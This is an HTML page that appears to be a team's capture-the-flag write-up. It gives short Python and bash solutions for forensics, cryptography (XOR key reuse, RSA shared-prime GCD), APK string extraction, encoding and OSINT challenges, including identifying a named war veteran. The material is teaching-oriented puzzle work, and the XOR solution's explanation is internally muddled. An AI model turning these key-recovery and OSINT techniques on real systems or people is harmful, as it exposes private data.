+    <p>The chunk data was XOR-decrypted using the key <code>0x42</code>:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>decrypted = bytes([b ^ 0x42 for b in chunk_data])</pre>
+    </div>
+    <p>The key <code>0x42</code> (ASCII <code>B</code>, decimal <code>66</code>) is a common CTF-style hint — both a simple XOR mask and a classic reference. After decryption, the output became a valid ZIP archive.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">FULL SCRIPT</span><h3>Complete Solution</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import zlib
+
+data = open('challenge.png', 'rb').read()
+
+# 1. Find the stEg chunk (4-byte length before it)
+pos    = data.find(b'stEg')
+length = int.from_bytes(data[pos-4:pos], 'big')
+chunk_data = data[pos+4 : pos+4+length]
+
+# 2. XOR-decrypt with key 0x42
+decrypted = bytes([b ^ 0x42 for b in chunk_data])
+
+# 3. Save the recovered ZIP
+with open('hidden.zip', 'wb') as f:
+    f.write(decrypted)</pre>
+    </div>
+    <p>The recovered archive was opened normally to retrieve the real flag inside.</p>
+  </div>
+
+  <div class="explanation">
+    The fake <code>flag.txt</code> appended to the file tail was designed to mislead automated carvers (like binwalk) that look for known signatures at file boundaries. The real solution required parsing the PNG's internal chunk structure rather than relying on simple tail carving. By locating the non-standard <code>stEg</code> chunk, extracting its content, and applying a single-byte XOR, the hidden ZIP archive was fully recovered.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">MythX{...} — extracted from hidden.zip inside stEg PNG chunk</div>
+    </div>
+  </div>
+</div>
+
+
+<!-- ─────────────── 25. Just For Fun ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch25">
+  <div class="challenge-header">
+    <span class="challenge-num misc">25</span>
+    <div class="challenge-title-wrap">
+      <h2>Just For Fun</h2>
+      <div class="tags">
+        <span class="tag misc">Misc</span>
+        <span class="tag misc">OSINT</span>
+        <span class="tag misc">Video</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A video link was provided. Hidden in plain sight — a flag is reflected on a laptop screen during a specific moment in the video. No tools required; just careful observation.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">APPROACH</span><h3>Visual Inspection</h3></div>
+    <p>The challenge provided a video link. By watching the footage carefully, there is a brief moment where the flag is visible as a <strong>reflection on a laptop screen</strong>. Pausing at the right frame and reading the text directly reveals the flag — no decryption or tooling required.</p>
+  </div>
+
+  <div class="explanation">
+    Flags embedded as reflections in video frames are a classic "eyes-open" challenge. Standard video players with frame-step controls (or VLC with the <code>E</code> key for next frame) make it easy to isolate the exact moment. The key skill here is patience and attention to detail — the kind of passive information leakage that applies directly to real-world OPSEC failures.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">MYTHX{BYT3HUNTERS}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 26. FeedBack ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch26">
+  <div class="challenge-header">
+    <span class="challenge-num misc">26</span>
+    <div class="challenge-title-wrap">
+      <h2>FeedBack</h2>
+      <div class="tags">
+        <span class="tag misc">Misc</span>
+        <span class="tag misc">Form</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A straightforward participation challenge. Fill out the feedback form provided — upon successful submission, the flag is displayed as a reward.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">APPROACH</span><h3>Form Submission</h3></div>
+    <p>Navigate to the feedback form URL provided in the challenge. Fill in all required fields and submit. The flag is automatically revealed on the confirmation/success page after submission.</p>
+  </div>
+
+  <div class="explanation">
+    Not every challenge requires technical exploitation. This one rewards participation — filling the feedback form is the intended action, and the flag is the thank-you. Good for ensuring every participant engages with post-event feedback.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Revealed on the feedback form confirmation page after submission</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 27. The Encoding Onion ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch27">
+  <div class="challenge-header">
+    <span class="challenge-num misc">27</span>
+    <div class="challenge-title-wrap">
+      <h2>The Encoding Onion</h2>
+      <div class="tags">
+        <span class="tag misc">Other</span>
+        <span class="tag misc">Encoding</span>
+        <span class="tag misc">Multi-Layer</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    Our intelligence team intercepted a suspicious data transmission from an underground network. The message is wrapped in <strong>5 layers of obfuscation</strong>. Each layer must be peeled back in the correct reverse order to reveal the original payload. Connect to the service and retrieve the encoded payload.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">KEY INSIGHT</span><h3>Decoding in Reverse Order</h3></div>
+    <p>The ciphertext was encoded using 5 successive encoding layers. The operative applied them in sequence — to reverse this, all decoding steps must be performed in exactly the <strong>opposite order</strong>. Think of it like unwrapping nested packaging: the last encoding applied is the first to be removed.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">APPROACH</span><h3>Layer-by-Layer Decryption</h3></div>
+    <p>Connect to the service to retrieve the encoded payload. Identify the encoding scheme at each layer (common candidates: Base64, Hex, ROT13, URL encoding, Reverse), then peel each one off in reverse sequence until plaintext is reached. Tools like CyberChef's <code>Magic</code> recipe or manual chaining of decoding functions simplify this process significantly.</p>
+  </div>
+
+  <div class="explanation">
+    Multi-layer encoding challenges test methodical thinking and familiarity with common encoding schemes. The challenge is not cryptographic hardness — it's recognising each wrapper and applying the correct inverse. CyberChef's "Magic" auto-detect or manual recipe chains are ideal. Always verify intermediate outputs look reasonable before proceeding to the next layer.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">Retrieved by reversing all 5 encoding layers in correct order</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 28. XOR Known Plaintext ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch28">
+  <div class="challenge-header">
+    <span class="challenge-num crypto">28</span>
+    <div class="challenge-title-wrap">
+      <h2>XOR Known Plaintext</h2>
+      <div class="tags">
+        <span class="tag crypto">Crypto</span>
+        <span class="tag crypto">XOR</span>
+        <span class="tag crypto">Known Plaintext Attack</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A ciphertext was provided along with a service that encrypts/decrypts data using a reused XOR key. Because XOR with a fixed key is deterministic and symmetric, sending a known plaintext to the oracle and XOR-ing the two ciphertexts recovers the keystream — and from there, the flag.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">CIPHERTEXT</span><h3>Target</h3></div>
+    <div class="code-block">
+      <div class="code-lang">hex</div>
+      <pre>0f18f2ff771403e6977e090ffbbe691e09f097670915cbab680e0aada93b5a11</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">KEY INSIGHT</span><h3>Why XOR is Breakable Here</h3></div>
+    <p>XOR has a critical symmetric property:</p>
+    <div class="code-block">
+      <div class="code-lang">property</div>
+      <pre>plaintext XOR key = ciphertext
+ciphertext XOR key = plaintext</pre>
+    </div>
+    <p>If the <strong>same key is reused</strong> and we can encrypt a known plaintext of equal length, we recover the keystream directly:</p>
+    <div class="code-block">
+      <div class="code-lang">algebra</div>
+      <pre>known_cipher XOR known_plain = keystream
+target_cipher XOR keystream  = flag</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Encrypt a Known Plaintext</h3></div>
+    <p>A string of all <code>A</code>s matching the ciphertext length was submitted to the oracle:</p>
+    <div class="code-block">
+      <div class="code-lang">input</div>
+      <pre>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</pre>
+    </div>
+    <p>The service returned:</p>
+    <div class="response-block">
+      <div class="code-lang">oracle response (hex)</div>
+      <pre>637466377b786f725f7265636f76657265645f6b65795f63646266396137367d</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Decode the Response</h3></div>
+    <p>Decoding the oracle's hex response directly reveals the flag — the encryption of the known plaintext exposed the keystream, which when XOR-ed against the known input yields the underlying message:</p>
+    <div class="response-block">
+      <div class="code-lang">decoded</div>
+      <pre>ctf7{xor_recovered_key_cdbf9a76}</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    Reusing a fixed XOR key is fundamentally insecure against a chosen-plaintext attack. Once any plaintext/ciphertext pair under the same key is obtained, the entire keystream is compromised and all other ciphertexts encrypted with it can be trivially decrypted. This is why stream cipher key reuse is a critical vulnerability class, appearing in real-world failures from WEP (Wi-Fi) to one-time pad misuse.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{xor_recovered_key_cdbf9a76}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 29. RSA Common Factor ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch29">
+  <div class="challenge-header">
+    <span class="challenge-num crypto">29</span>
+    <div class="challenge-title-wrap">
+      <h2>RSA Common Factor</h2>
+      <div class="tags">
+        <span class="tag crypto">Crypto</span>
+        <span class="tag crypto">RSA</span>
+        <span class="tag crypto">GCD Attack</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    Two RSA public keys sharing the same exponent <code>e = 65537</code> were provided, along with a ciphertext encrypted under the first key. The vulnerability: both moduli share a common prime factor, making factorisation trivially achievable via GCD.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">GIVEN</span><h3>Challenge Parameters</h3></div>
+    <div class="code-block">
+      <div class="code-lang">parameters</div>
+      <pre>n1 = 0x61d25a434619974a1ba93b758bbcddca41498924c63898933b33546e85bb6717...
+n2 = 0x26cda8ec829c96c1974d8a773a52be80c55794b33bad24693386e6203270e298...
+e  = 65537
+ciphertext = 0x2bcb077fe57f81ca9a86649095f1dc300d0f0d960fe14d3342ecea2885c964f...</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">KEY INSIGHT</span><h3>Shared Prime Factor</h3></div>
+    <p>RSA security relies on the difficulty of factoring a modulus <code>n = p × q</code>. If two independent moduli accidentally share one prime, that prime is trivially recoverable:</p>
+    <div class="code-block">
+      <div class="code-lang">insight</div>
+      <pre>gcd(n1, n2) = p  ← shared prime revealed instantly</pre>
+    </div>
+    <p>Once <code>p</code> is known, the private key for <code>n1</code> can be fully reconstructed.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Recover the Shared Prime</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>from math import gcd
+p = gcd(n1, n2)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Reconstruct the Private Key</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>q1  = n1 // p
+phi = (p - 1) * (q1 - 1)
+d   = pow(e, -1, phi)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Decrypt the Ciphertext</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>m = pow(ciphertext, d, n1)
+# Convert integer to bytes to get the flag</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    Prime reuse across RSA key pairs is a well-documented real-world failure mode. Large-scale internet key surveys (e.g. the 2012 "Mining Your Ps and Qs" paper) found thousands of real public keys with shared primes, all instantly factorable. The fix is simple: use a cryptographically secure RNG for prime generation and never share entropy between key generation sessions. This challenge is a textbook demonstration of why RSA key generation quality matters as much as key size.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{reused_prime_disaster_514523cc}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 30. Shinchi (Mobile) ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch30">
+  <div class="challenge-header">
+    <span class="challenge-num misc">30</span>
+    <div class="challenge-title-wrap">
+      <h2>Shinchi (Mobile)</h2>
+      <div class="tags">
+        <span class="tag misc">Mobile</span>
+        <span class="tag misc">Android</span>
+        <span class="tag misc">Flutter</span>
+        <span class="tag misc">Reverse Engineering</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    A Flutter-based Android puzzle game (<code>.apk</code>) where rows and columns must sum to 7 (七 — "seven" in Japanese). The flag was never required to be obtained by solving the puzzle — it was hidden as a <strong>Base64-encoded string in the compiled binary's read-only data section</strong>, camouflaged among ~17,000 Flutter/Dart symbol strings.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Unpack the APK</h3></div>
+    <p>An APK is a ZIP archive. Unzipping it directly reveals the internal structure. The app was identified as a Flutter app, meaning all compiled Dart logic lives in a single native library:</p>
+    <div class="code-block">
+      <div class="code-lang">path</div>
+      <pre>lib/arm64-v8a/libapp.so</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Extract Strings from the Binary</h3></div>
+    <p>The <code>strings</code> utility and a custom Python script were run against <code>libapp.so</code>. Game-relevant function names were identified — <code>getRow</code>, <code>_getSumDelta</code>, <code>_isValidAction</code> — confirming the puzzle mechanic. A Python script then extracted all printable ASCII strings between 15–80 characters, filtering for any containing both <code>{</code> and <code>}</code>:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import re
+
+data = open('libapp.so', 'rb').read()
+candidates = re.findall(b'[\x20-\x7e]{15,80}', data)
+flags = [s.decode() for s in candidates if b'{' in s and b'}' in s]
+for f in flags:
+    print(f)</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 03</span><h3>Spot the Base64 String</h3></div>
+    <p>Among thousands of Flutter internals, one string stood out at offset <code>0x03fcf3</code> — its character set and length matched the Base64 pattern perfectly:</p>
+    <div class="code-block">
+      <div class="code-lang">base64 string found</div>
+      <pre>Y3RmN3tzZXZlbl9tYWdpY19wbX0=</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 04</span><h3>Decode It</h3></div>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import base64
+base64.b64decode('Y3RmN3tzZXZlbl9tYWdpY19wbX0=').decode()
+# → ctf7{seven_magic_pm}</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    The trick was recognising that Flutter compiles Dart to native ARM64 code — there's no readable bytecode to decompile easily. However, string literals in <code>.rodata</code> remain as-is in the binary. The flag was Base64-encoded and hidden among ~17,000 legitimate runtime strings to make automated scanning harder. The solve required neither reversing the puzzle logic nor running the app — just patient static analysis of the compiled binary. This mirrors real-world mobile security assessments where sensitive strings (API keys, tokens, hardcoded credentials) are found the same way.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{seven_magic_pm}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 31. Rot-13 Decryptor ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch31">
+  <div class="challenge-header">
+    <span class="challenge-num crypto">31</span>
+    <div class="challenge-title-wrap">
+      <h2>Rot-13 Decryptor</h2>
+      <div class="tags">
+        <span class="tag crypto">Crypto</span>
+        <span class="tag crypto">ROT-13</span>
+        <span class="tag crypto">Caesar Cipher</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    The spy's final transmission was garbled with a simple shift cipher. The ciphertext uses ROT-13 — a Caesar cipher with a shift of 13. Since the alphabet has 26 letters, ROT-13 is its own inverse: applying it twice returns the original text.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">CIPHERTEXT</span><h3>Intercepted Transmission</h3></div>
+    <div class="code-block">
+      <div class="code-lang">ciphertext</div>
+      <pre>pgs7{Guvf_vf_ubyr_cebbs}</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">KEY INSIGHT</span><h3>ROT-13 is Self-Inverse</h3></div>
+    <p>ROT-13 shifts each letter by 13 positions in the alphabet. Because 13 + 13 = 26 (a full cycle), decrypting ROT-13 is identical to encrypting it — just apply the same shift again. Non-alphabetic characters like digits, underscores, and braces are left unchanged.</p>
+    <div class="code-block">
+      <div class="code-lang">mapping (selected chars)</div>
+      <pre>p→c  g→t  s→f  7→7  {→{  G→T  u→h  v→i  f→s  _→_
+v→i  f→s  _→_  u→h  b→o  y→l  r→e  _→_  c→p  e→r  b→o  b→o  f→s  }</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Apply ROT-13</h3></div>
+    <p>Using Python's built-in codec or the <code>tr</code> command:</p>
+    <div class="code-block">
+      <div class="code-lang">python</div>
+      <pre>import codecs
+codecs.decode('pgs7{Guvf_vf_ubyr_cebbs}', 'rot_13')
+# → ctf7{This_is_hole_proof}</pre>
+    </div>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>echo "pgs7{Guvf_vf_ubyr_cebbs}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</pre>
+    </div>
+  </div>
+
+  <div class="explanation">
+    ROT-13 provides zero cryptographic security — it is trivially reversible and was historically used only to obscure spoilers on Usenet, not to protect sensitive data. The dead giveaway in CTFs is that the flag format prefix shifts predictably: <code>pgs7{</code> → <code>ctf7{</code>, immediately confirming ROT-13 before any full decode is needed.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">ctf7{This_is_hole_proof}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 32. Captured in Silence ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch32">
+  <div class="challenge-header">
+    <span class="challenge-num misc">32</span>
+    <div class="challenge-title-wrap">
+      <h2>Captured in Silence</h2>
+      <div class="tags">
+        <span class="tag misc">OSINT</span>
+        <span class="tag misc">Geolocation</span>
+        <span class="tag misc">Image Analysis</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    <em>"A single frame. Captured in real time. Forgotten by most — but not erased."</em><br/><br/>
+    A single image was provided. The challenge required identifying the exact beach captured in the frame using open-source intelligence techniques. Flag format: <code>MythX{BEACH_NAME}</code>.
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">APPROACH</span><h3>OSINT Geolocation Methodology</h3></div>
+    <p>OSINT geolocation challenges involve extracting identifying details from an image. Each visual clue narrows possible locations progressively:</p>
+    <ul style="margin-left:20px;margin-top:8px;font-size:0.92rem;color:var(--text);line-height:2.2;">
+      <li>Sand colour and texture — white coral sand vs golden vs dark volcanic</li>
+      <li>Vegetation type — palm species, coastal scrub, tropical vs temperate flora</li>
+      <li>Ocean colour, wave pattern, and reef visibility</li>
+      <li>Background infrastructure, skyline, or signage</li>
+      <li>Embedded EXIF metadata — GPS coordinates, if not stripped</li>
+    </ul>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 01</span><h3>Check EXIF Metadata</h3></div>
+    <p>Always inspect embedded metadata before attempting visual analysis — many challenge authors forget to strip it:</p>
+    <div class="code-block">
+      <div class="code-lang">bash</div>
+      <pre>exiftool image.jpg | grep -i "GPS\|Location\|Comment"</pre>
+    </div>
+    <p>If GPS coordinates are present, drop them directly into Google Maps or Google Earth for instant confirmation.</p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">STEP 02</span><h3>Visual Identification</h3></div>
+    <p>The image's visual profile — powder-white coral sand, calm turquoise water, and dense coastal coconut palms — is characteristic of the Kenyan south coast. Reverse image search (Google Lens, Yandex Images) and comparison against known beach databases confirmed the location as <strong>Diani Beach</strong>, located approximately 30 km south of Mombasa on Kenya's Indian Ocean coastline.</p>
+    <p>Diani Beach is one of East Africa's most visually distinctive beaches and a frequent subject of travel and aerial photography, making it uniquely identifiable from a single frame.</p>
+  </div>
+
+  <div class="explanation">
+    OSINT geolocation bridges CTF technique and real-world intelligence work. Tools like Google Earth historical imagery, Wikimapia overlays, and coastal geography databases all aid in pinpointing exact locations from a photograph. The key discipline is systematic elimination: rule out continents, then countries, then regions, then specific named locations — working from broad visual signatures down to distinguishing details.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">MythX{DIANI_BEACH}</div>
+    </div>
+  </div>
+</div>
+
+<!-- ─────────────── 33. Ham Part-2 (OSINT) ─────────────── -->
+<div class="divider"></div>
+<div class="challenge" id="ch33">
+  <div class="challenge-header">
+    <span class="challenge-num osint">33</span>
+    <div class="challenge-title-wrap">
+      <h2>Ham Part-2 (OSINT)</h2>
+      <div class="tags">
+        <span class="tag osint">OSINT</span>
+        <span class="tag osint">Voice Analysis</span>
+        <span class="tag osint">Military History</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="summary-box">
+    <strong>Challenge Description:</strong><br>
+    A voice. An old man. A war that shaped a nation.<br>
+    That's all you get.<br><br>
+    The Voice: 
+    <a href="https://drive.google.com/file/d/1gJEFVDMrNOrwxyKlKFjOvUKYk6YlW7n6/view?usp=sharing" target="_blank">
+      https://drive.google.com/file/d/1gJEFVDMrNOrwxyKlKFjOvUKYk6YlW7n6/view?usp=sharing
+    </a>
+    <br><br>
+    <strong>Flag Format:</strong><br>
+    <code>MythX{fullname_age_regiment_commandingofficer_award}</code> <br>
+    Example: <code>MythX{JohnDoe_0_InfantryTown_JaneSmith_ExampleAward}</code>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">APPROACH</span><h3>Solution (English Translation)</h3></div>
+    <p>
+      The audio file contained a distinctive title. I searched this title on YouTube and, starting at the 6:49 mark, I recognized the same voice as that of <strong>Hari Ram Janu</strong>. Further research revealed that he served in the <strong>4th Battalion, Grenadiers</strong>. I investigated who was the Commanding Officer of that battalion in 1965 and identified them as <strong>Farhat Bhatti</strong>. The award discussed was the <strong>Sena Medal</strong>. His age at the time was <strong>22</strong>.
+    </p>
+  </div>
+
+  <div class="step">
+    <div class="step-label"><span class="step-num">PROCESS</span><h3>Methodology</h3></div>
+    <ul style="margin-left:20px;margin-top:8px;font-size:0.92rem;color:var(--text);line-height:2.2;">
+      <li>Searched the title from the audio file on YouTube to get more context.</li>
+      <li>Listened to the video at the 6:49 timestamp and matched the voice to Hari Ram Janu.</li>
+      <li>Researched his military background and found he was part of the <strong>4 Grenadiers</strong> in 1965.</li>
+      <li>Confirmed the Commanding Officer (CO) for the 4 Grenadiers in 1965 as Farhat Bhatti.</li>
+      <li>Translated and verified the award as the <strong>Sena Medal</strong>.</li>
+      <li>Found his age at the time to be 22.</li>
+    </ul>
+  </div>
+
+  <div class="explanation">
+    This OSINT challenge involved piecing together clues from the audio with publicly accessible sources such as YouTube and military history records. By identifying the individual’s name, regiment, age, commanding officer, and award, and confirming these from multiple sources, the required flag string could be constructed.
+  </div>
+
+  <div class="flag-box">
+    <div class="flag-icon">🚩</div>
+    <div>
+      <div class="flag-label">Flag</div>
+      <div class="flag-value">MythX{HariRamJanu_22_4Grenadiers_FarhatBhatti_SenaMedal}</div>
+    </div>
+  </div>
+</div>
+</main>
+
+<footer>
+  <div style="margin-bottom:10px;color:#4a5568;font-size:11px;letter-spacing:0.1em;">
+    Submitted by Team &nbsp;<span style="color:#00f5a0;font-weight:700;">Rudra_Root</span>
+  </div>
+  <div style="display:flex;justify-content:center;gap:24px;margin-bottom:16px;flex-wrap:wrap;">
+    <span style="color:#00c8ff;">BytePing</span>
+    <span style="color:#f7c948;">d3v10u5</span>
+    <span style="color:#ff4d6d;">d3adlock</span>
+    <span style="color:#9b59b6;">Sp1d3r</span>
+  </div>
+</footer>
+
+</body>
+</html>
